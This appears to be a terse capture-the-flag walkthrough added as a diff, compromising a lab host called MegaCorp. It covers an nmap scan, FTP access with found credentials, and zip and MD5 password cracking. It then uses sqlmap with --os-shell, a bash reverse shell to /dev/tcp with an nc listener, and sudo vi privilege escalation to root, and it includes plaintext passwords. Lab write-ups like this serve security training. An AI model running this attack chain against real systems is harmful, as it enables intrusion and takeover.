@@ -1,0 +1,48 @@
+---NMAP SCAN---
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: MegaCorp Login
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+---ftp server found---
+login with the usr/pass previously found;(ftpuser / mc@F1l3ZilL4)
+found encrypted backup.zip;
+decripted using JohnTheReaper;
+*zip2john backpup.zip > output_hash
+*john output_hash --fork=4 --wordlist=~/rockyou.txt 
+*john --show outputhash; (741852963)
+
+---found index.php---
+if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
+online hash killer (crackstation.net) --> qwerty789
+
+---login into http---
+admin/qwerty789
+found a sql search http://10.10.10.46/dashboard.php?search=a;
+using the cookie found on the header
+*sqlmap -u '10.10.10.46/dashboard.php?search=a' --cookie=XXX
+found vulnerabilitie on search, exploit using sqlmap shell
+*sqlmap -u '10.10.10.46/dashboard.php?search=a' --cookie=XXX --os-shell
+*bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
+using a listener on server
+*nc -lvp 4444
+
+
+---found /var/www/html/dashboard.php---
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+using this password on sudo command
+*sudo -l
+found command /bin/vi /etc/postgresql/11/main/pg_hba.conf
+*sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+executing a /bin/bash using vi and we are root
